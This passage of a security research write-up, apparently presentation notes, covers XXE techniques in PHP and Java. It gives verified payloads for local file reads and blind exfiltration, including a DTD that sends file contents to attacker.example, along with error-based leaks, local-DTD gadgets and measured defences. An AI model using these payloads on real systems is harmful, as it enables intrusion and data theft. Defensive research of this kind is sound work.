Empirical results from `research/lab/`. "PHP" = PHP 8.4.19 / libxml 2.9.14 via
`simplexml_load_string(..., LIBXML_NOENT|LIBXML_DTDLOAD)`; "Java" = OpenJDK 21.0.10 via a
default `DocumentBuilderFactory`.

| Technique | System identifier | PHP | Java |
|---|---|---|---|
| **No scheme, absolute path** | `SYSTEM "/etc/passwd"` | ✅ | ✅ |
| **No scheme, relative path** | `SYSTEM "secret.txt"` | ✅ | ✅ |
| **PHP stream filter** | `php://filter/convert.base64-encode/resource=/etc/passwd` | ✅ | n/a |
| **zlib wrapper** | `compress.zlib:///etc/passwd` | ✅ | n/a |
| **phar wrapper** | `phar:///path/bundle.zip/conf/db.txt` | ✅ | n/a |
| **data wrapper** (payload staging) | `data://text/plain;base64,…` | ✅ | n/a |
| **Java archive** | `jar:file:///path/app.war!/WEB-INF/web.xml` | n/a | ✅ |
| **XInclude, no DOCTYPE** | `<xi:include parse="text" href="/etc/passwd"/>` | ✅ | ✅ (XIncludeAware) |
| zip wrapper | `zip:///path/a.zip#entry` | ❌ | n/a |
| glob wrapper | `glob:///path/*.txt` | ❌ | n/a |
| `netdoc:` | `netdoc:/etc/passwd` | n/a | ❌ (JDK ≥ 9) |
| `expect://` | `expect://id` | ext not present | n/a |
| `http(s)://`, `ftp://` | network fetch, not a local read | SSRF | SSRF |

### 4.1 The best answer: drop the scheme entirely

A `SYSTEM` identifier is a **URI reference**, resolved against the document's base URI.
Both libxml2 and the JDK fall back to opening a scheme-less reference as a local path.

```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "/etc/passwd"> ]>
<r>&xxe;</r>
```

**[verified]**

```
A file:// (baseline)             => SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
B bare absolute path (no scheme) => SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
C bare relative path             => SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
```

Identical in Java. This defeats every filter that blocklists the string `file://` — which
is most of the naive ones. Relative paths additionally resolve against the **document's**
base URI, so `../../../../etc/passwd` traverses from wherever the parser thinks it is.

**One caveat, and it bites people.** "Resolved against the base URI" is the whole
mechanism, so it only lands on the filesystem when the base URI *is* local — which it is
for a document parsed from a string, a stream or a local file. Put the same scheme-less
path inside a DTD you are serving over HTTP and it resolves against **that** URL and comes
straight back to your own web server instead. See §5.4, where exactly that happened in the
lab. Rule of thumb: **drop the scheme in the document, name the scheme in a remote DTD.**

### 4.2 PHP stream wrappers

libxml2 in PHP resolves system identifiers through PHP's registered stream wrappers.
`stream_get_wrappers()` on a default install returns:
`https, ftps, compress.zlib, php, file, glob, data, http, ftp, phar, zip`.

- **`php://filter/convert.base64-encode/resource=<path>`** — the workhorse; see §3.2.
- **`compress.zlib://<path>`** — **[verified]** returns the file contents. It also handles
  gzip transparently, which means it reads `.gz` logs and backups that `file://` would
  hand you as binary garbage.
- **`phar://<archive>/<entry>`** — **[verified]** reads an entry out of an archive, and it
  accepts plain ZIPs, not just real phars:
  ```
  phar:// (needs real phar)  => ZIP-ENTRY: password=s3cr3t
  ```
  Deployed apps ship as archives; this reads inside them. (Historically `phar://` also
  triggers PHP object injection on unserialize-adjacent sinks — out of scope here but worth
  a sentence in a presentation.)
- **`data://text/plain;base64,…`** — **[verified]** not a *file* read; it stages a payload.
  The classic use is smuggling a whole second-stage system identifier past a filter:
  ```xml
  <!DOCTYPE t [ <!ENTITY % init SYSTEM
     "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
  ```
- **`zip://<archive>#<entry>` — does not work through XXE. [verified]** libxml2 parses the
  `#` as a URI fragment and refuses:
  ```
  zip:// raw #        => (parse failed)  [Fragment not allowed]
  zip:// %23 encoded  => (empty)  [failed to load external entity "zip://…%23conf/db.txt"]
  ```
  Percent-encoding does not rescue it. **Use `phar://` instead** — same capability, no
  fragment. Cheat sheets that list `zip://` for XXE are wrong for libxml2.
- **`glob://` — does not work. [verified]** `failed to load external entity`. It is a
  directory-enumeration wrapper that does not expose a readable stream, so it is unusable
  as an entity source.
- **`expect://cmd`** — command execution, but it needs the PECL `expect` extension, which
  is not bundled and was not present in the lab. Treat as "rarely available", not as a
  standard technique.

### 4.3 Java

- **`netdoc:` is dead. [verified]**
  ```
  D netdoc: (legacy sun handler)  => EXC MalformedURLException: unknown protocol: netdoc
  ```
  `sun.net.www.protocol.netdoc.Handler` was **removed in JDK 9** (JDK-8154234 /
  JDK-8176351); constructing such a URL now throws `MalformedURLException`. Every payload
  list that still recommends `netdoc:/etc/passwd` is targeting Java 8 and earlier. Say
  this explicitly — it is the single most-repeated stale XXE payload.
- **`jar:file:///path/archive!/entry` — works. [verified]**
  ```
  F jar:file:...!/entry  => ZIP-ENTRY: password=s3cr3t
  ```
  It does nest a `file:` URL, so it is not a `file://`-free technique in the strict sense,
  but it reads *inside* archives, which plain `file:` cannot. `jar:http://attacker/x.zip!/y`
  makes the JVM download a remote archive to a temp file first — a file-write/DoS primitive
  as much as a read one.
- **A bare path is the Java answer to the "no `file://`" constraint**, exactly as in §4.1.
- The JDK's default `DocumentBuilderFactory` resolves external entities **with no
  configuration at all** — see §6.

### 4.4 Scheme-free, DOCTYPE-free: XInclude

Covered in §3.4 and worth repeating here because it answers both questions at once: no
`file://`, no `DOCTYPE`, arbitrary binary-ish content, verified in both stacks.

---

## 5. Blind XXE and data exfiltration

Blind XXE = the entity is resolved but nothing comes back in the response. Four channels,
in rough order of preference.

### 5.1 Step 0 — prove resolution happens

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://<id>.collab.example/x"> %ext; ]>
<r></r>
```

A DNS lookup alone is enough to confirm; in egress-filtered environments DNS often escapes
when HTTP does not. Use Burp Collaborator, `interactsh`, or your own authoritative DNS.

### 5.2 Why the naive nested payload always fails

The obvious thing — define `%file` and reference it inside a second entity declaration, all
in the internal subset — is forbidden by XML 1.0 itself (WFC: *PEs in Internal Subset*: a
parameter-entity reference may not occur **within a markup declaration** in the internal
subset).

**[verified]** — attempting exactly that:

```
--- 1) Naive attempt: nest parameter entities in the INTERNAL subset ---
  ERR: PEReferences forbidden in internal subset
  ERR: PEReference: %eval; not found
  ERR: PEReference: %exfil; not found
```

That single well-formedness constraint is *the* reason blind XXE needs an external DTD. It
is the best thing to open a presentation with, because it explains every payload that
follows.

### 5.3 Channel 1 — out-of-band via an external DTD (verified end to end)

`evil.dtd`, hosted on the attacker's server:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/steal?d=%file;'>">
%eval;
%exfil;
```

Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd">
  %dtd;
]>
<r>x</r>
```

Mechanics, in order: `%dtd;` fetches the DTD → `%eval;` expands to a *declaration* of
`%exfil` (the `&#x25;` is a literal `%`, needed because a bare `%` inside an entity value
would be parsed as a reference) → `%exfil;` is dereferenced, and resolving it makes the
parser fetch a URL that carries the file contents in the query string.

**[verified]** — collector log from the lab:

```
HIT /evil.dtd
HIT /steal?d=U0VDUkVUX0ZMQUc9Y3UtY3J5cHRvLTIwMjYKZGJfcGFzc3dvcmQ9UEBzc3cwcmQK
```

`base64 -d` of that value is `SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd`.

**Practical notes.**

- **Always base64 first.** Raw file bytes contain `\n`, `&`, `#` and `%`, all of which
  either terminate the URI or are re-parsed as markup. `php://filter` does this for free on
  PHP; on other stacks you get one line at best, which is why so many write-ups warn "you
  may only receive the first line".
- **Size limits.** The exfiltrated data rides in a URL. Servers and libraries cap URL
  length (commonly 4–8 KB), and base64 inflates by 4/3. For large files, exfiltrate in
  pieces — different files per request, or a filter that shrinks the data first.
- **DNS-only egress:** put the data in a label —
  `'http://%file;.collab.example/'` — subject to the 63-byte-per-label and 253-byte-total
  DNS limits, so it only carries small secrets and needs an alphabet-safe encoding.

### 5.4 Channel 2 — error-based (data in the parser's error message)

Force the parser to fail on a path that *contains* the stolen data, and read it out of
the error the application echoes. No outbound request ever carries the bytes.

`error.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Payload — identical to §5.3:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % dtd SYSTEM "http://attacker.example/error.dtd"> %dtd; ]>
<r>x</r>
```

**[verified] — it leaks in both stacks.**

Java (OpenJDK 21) throws straight out of `parse()`, with the file in the message. The
same content comes back whether the application prints `e.getMessage()`, installs a full
SAX `ErrorHandler`, or walks the `getCause()` chain:

```
A. no handler, print e.getMessage() only
  caught: FileNotFoundException: /nonexistent/SECRET_FLAG=cu-crypto-2026 db_password=P@ssw0rd (No such file or directory)
B. full ErrorHandler, print handler output
  caught: FileNotFoundException: /nonexistent/SECRET_FLAG=cu-crypto-2026 db_password=P@ssw0rd (No such file or directory)
C. no handler, walk getCause() chain
  cause:  FileNotFoundException: /nonexistent/SECRET_FLAG=cu-crypto-2026 db_password=P@ssw0rd (No such file or directory)
```

PHP/libxml2 leaks it as a URI-validation error:

```
Invalid URI: file:///nonexistent/SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
>>> LEAKED: SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
```

**The trap that makes this technique "not work" for most people. [verified]** Inside a DTD
fetched over HTTP, the DTD's own URL becomes the base URI, so a **scheme-less system
identifier — even an absolute filesystem path — is resolved against it** and fetched back
from the attacker's own web server instead of the target's disk. The first version of the
lab made exactly this mistake, and the collector log proves it:

```
HIT /error.dtd
HIT /home/user/Cryptography/research/lab/tmp/secret.txt      <-- came back to the attacker
```

`%file` then held whatever that request returned, and the "leak" was that string rather
than the file. **In a remote DTD, always name the scheme** (`file:///etc/passwd`, or a
`php://filter/...` URL, which carries its own). This is the opposite of §4.1, where
dropping the scheme is the win — the difference is entirely which base URI applies.

Two more practical notes:

- Error-based only reaches the attacker if the application actually surfaces parser
  errors. A service that returns a flat `400 Bad Request` gives you nothing; a stack trace
  or a `<faultstring>` in a SOAP response gives you everything.
- The leak is bounded by the error-message and path-length limits, so it suits
  small, high-value files (`.env`, a private key header, `/proc/self/environ`) rather than
  whole source trees.

### 5.5 Channel 3 — local DTD reuse (zero outbound traffic)

When egress is blocked entirely, you cannot fetch `evil.dtd`. The trick (Yunusov &
Osipov; catalogued by GoSecure's `dtd-finder`) is to load a DTD that is **already on the
target's disk** and *redefine* one of the parameter entities it declares. Because the
redefinition happens inside an external subset, the nesting restriction of §5.2 no longer
applies.

The canonical Linux gadget is `/usr/share/xml/fontconfig/fonts.dtd`, which declares at
line 148:

```
<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>
```

**[verified]** — that file and that entity are present on a stock Debian-family image, and
the attack works with no network access at all:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % constant 'aaa)>
     <!ENTITY &#x25; file SYSTEM "/etc/passwd">
     <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
     &#x25;eval;
     &#x25;error;
     <!ELEMENT aa (bb'>
  %local_dtd;
]>
<r>x</r>
```

Result on JDK 21:

```
FileNotFoundException: /nonexistent/SECRET_FLAG=cu-crypto-2026 db_password=P@ssw0rd (No such file or directory)
```

The `aaa)>` prefix and the trailing `<!ELEMENT aa (bb` are there to close the markup
declaration the entity was originally embedded in and to re-open a syntactically valid one,
so the surrounding DTD still parses.

**Finding a gadget DTD.** `locate .dtd` / `find / -name '*.dtd'`. On the lab image:
`/usr/share/xml/fontconfig/fonts.dtd`, `/usr/share/xml/schema/xml-core/catalog.dtd`,
`/usr/share/glib-2.0/schemas/gschema.dtd`, `/usr/share/polkit-1/policyconfig-1.dtd`, plus
a large set under `/usr/lib/libreoffice/share/dtd/`. On Windows the well-known ones are
`C:\Windows\System32\wbem\xml\cim20.dtd` (entity `%CIMName`),
`C:\Windows\System32\wbem\xml\wmi20.dtd`, and `C:\Windows\System32\xwizard.dtd`
(`%onerrortypes`). Confirm the error message even *contains* filenames first:

```xml
<!DOCTYPE r [ <!ENTITY % local_dtd SYSTEM "file:///abcxyz/"> %local_dtd; ]><r></r>
```

### 5.6 Channel 4 — last resort: boolean / timing

If nothing is reflected and nothing egresses, you still have differential behaviour:
a payload referencing an existing file parses, one referencing a missing file errors.
That gives a one-bit existence oracle per request. Timing (`file:///dev/random`, or a
`SYSTEM` pointing at a slow internal host) gives another. Slow, but it maps the filesystem
and the internal network.

### 5.7 Delivery: XXE is not only in `Content-Type: application/xml`

Worth a slide. Any of these reach an XML parser: SOAP bodies; SVG uploads (`<image
xlink:href=…>`); **DOCX / XLSX / PPTX** (rewrite `[Content_Types].xml` or `word/document.xml`
inside the ZIP); XML sitemaps and RSS ingest; SAML assertions; XMLRPC; and JSON endpoints
that also accept XML — flip `Content-Type: application/json` to `application/xml` and
resend, since many frameworks content-negotiate the body parser.

---

## 6. Defences — what actually works

Measured, not quoted.

**Java (OpenJDK 21, `DocumentBuilderFactory`) [verified]:**

```
default DocumentBuilderFactory (JDK 21)  => LEAKED: SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
FEATURE_SECURE_PROCESSING = true         => BLOCKED (SAXParseException)
setXIncludeAware(false) only             => LEAKED: SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
disallow-doctype-decl = true             => BLOCKED (SAXParseException)
external-general-entities = false        => (blocked: empty)
setExpandEntityReferences(false)         => (blocked: empty)
ACCESS_EXTERNAL_DTD = ""                 => BLOCKED (SAXParseException)
```

- **XXE is on by default in Java.** A stock `DocumentBuilderFactory` reads local files. This
  is the single most important line in the table.
- `http://apache.org/xml/features/disallow-doctype-decl = true` is the strongest and
  cheapest control — it rejects the document outright and kills every DTD-based variant.
- `FEATURE_SECURE_PROCESSING` and `ACCESS_EXTERNAL_DTD=""` also blocked it on JDK 21.
- `setXIncludeAware(false)` does nothing against entity XXE — but it *is* what stops §3.4,
  so you need both.

**PHP 8.4 / libxml 2.9.14 [verified]:**

```
simplexml_load_string, DEFAULT flags       => (blocked: empty)
simplexml_load_string, LIBXML_NOENT        => SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
DOMDocument->loadXML, DEFAULT flags        => (blocked: empty)
DOMDocument->loadXML, LIBXML_NOENT         => SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
DOMDocument, LIBXML_NOENT|LIBXML_NONET     => SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
```

- **PHP's defaults are safe**; it is the application passing `LIBXML_NOENT` that creates
  the vulnerability. Grep for it.
- **`LIBXML_NONET` does not stop local file reads** — it only blocks network fetches. It is
  routinely mistaken for an XXE fix.

**SSI (from §1–2):** prefer not enabling SSI at all; if it is required, `Options
IncludesNOEXEC` rather than `+Includes`; never let user input reach a page that is
SSI-parsed; serve uploads from a path/origin with SSI parsing off and with `.shtml`,
`.shtm`, `.stm` on the deny-list; on Tomcat leave `allowExec=false` and remove `printenv`
from anything that ships. Patch levels that matter: httpd ≥ 2.4.66, nginx ≥ 1.31.3/1.30.4,
Tomcat ≥ 7.0.94 / 8.5.40 / 9.0.19.

---

## 7. Reproducing the lab

Everything above is reproducible from `research/lab/`:

```
research/lab/
  README.md              how to run each piece, with expected output
  php_xxe_schemes.php    §3.1–§3.4, §4.2 — wrappers, filters, CDATA, XInclude
  XxeSchemes.java        §4.1, §4.3 — bare paths, netdoc, jar, XInclude
  php_defaults.php       §6 — PHP flag matrix
  DefTest.java           §6 — Java hardening matrix
  oob_collector.py       §5.3 — attacker-side collector, loopback only
  evil.dtd               §5.3 — out-of-band exfiltration DTD
  error.dtd              §5.4 — error-based DTD
  blind_xxe.php          §5.2–§5.4 — internal-subset limit, OOB, error-based
  LocalDtdError.java     §5.4, §5.5 — error-based, remote vs on-disk DTD
```

Requirements: PHP ≥ 8, JDK ≥ 17, Python 3. The collector binds to loopback only and the
payloads read files created inside the lab directory, so nothing leaves the machine.

---

## 8. Sources

**SSI — primary**
- Apache `mod_include` reference — <https://httpd.apache.org/docs/current/mod/mod_include.html> (directive syntax, `comment`/`set` attributes, `SSIStartTag`, `XBitHack`)
- Apache expression syntax (`ap_expr`), incl. the "restricted" markings — <https://httpd.apache.org/docs/current/expr.html>
- Apache httpd source: `modules/generators/mod_cgid.c`, `server/util.c`, `server/gen_test_char.c`, `CHANGES` — <https://github.com/apache/httpd>
- nginx `ngx_http_ssi_module` — <https://nginx.org/en/docs/http/ngx_http_ssi_module.html>
- nginx security advisories — <https://nginx.org/en/security_advisories.html>
- Tomcat SSI How-To — <https://tomcat.apache.org/tomcat-9.0-doc/ssi-howto.html>
- mod_perl `Apache::Include` (`#perl sub=`) — <https://perl.apache.org/docs/1.0/api/Apache/Include.html>

**SSI — vulnerability records**
- ASF advisory JSON, CVE-2025-58098 — <https://github.com/apache/httpd-site/blob/main/content/security/json/CVE-2025-58098.json>
- CVE-2026-56434 — <https://github.com/advisories/ghsa-m73p-xg7q-m8f2>
- CVE-2019-0221 — <https://seclists.org/fulldisclosure/2019/May/50>, <https://www.rapid7.com/db/vulnerabilities/apache-tomcat-cve-2019-0221/>
- CVE-2009-1195 — <https://bugzilla.redhat.com/show_bug.cgi?id=489436>
- CVE-2004-0940 — <https://security.gentoo.org/glsa/200411-03>, <https://www.exploit-db.com/exploits/587>
- CVE-2001-0506 / MS01-044 — <https://nvd.nist.gov/vuln/detail/CVE-2001-0506>
- CVE-2024-3788, CVE-2023-1728 — CVE records via <https://github.com/CVEProject/cvelistV5>
- OWASP, SSI Injection — <https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection>
- CWE-97 — <https://cwe.mitre.org/data/definitions/97.html>; CAPEC-101 — <https://capec.mitre.org/data/definitions/101.html>
- PortSwigger, SSI injection — <https://portswigger.net/kb/issues/00101100_ssi-injection>

**XXE**
- OWASP XXE Prevention Cheat Sheet — <https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md>
- PayloadsAllTheThings, XXE Injection — <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md>
- GoSecure `dtd-finder` local-DTD payload list — <https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md>
- JDK-8154234 / JDK-8176351, removal of the `netdoc` handler — <https://bugs.openjdk.org/browse/JDK-8154234>
- XML 1.0, WFC: PEs in Internal Subset — <https://www.w3.org/TR/xml/#wfc-PEinInternalSubset>
- XInclude 1.0, `parse="text"` — <https://www.w3.org/TR/xinclude/>
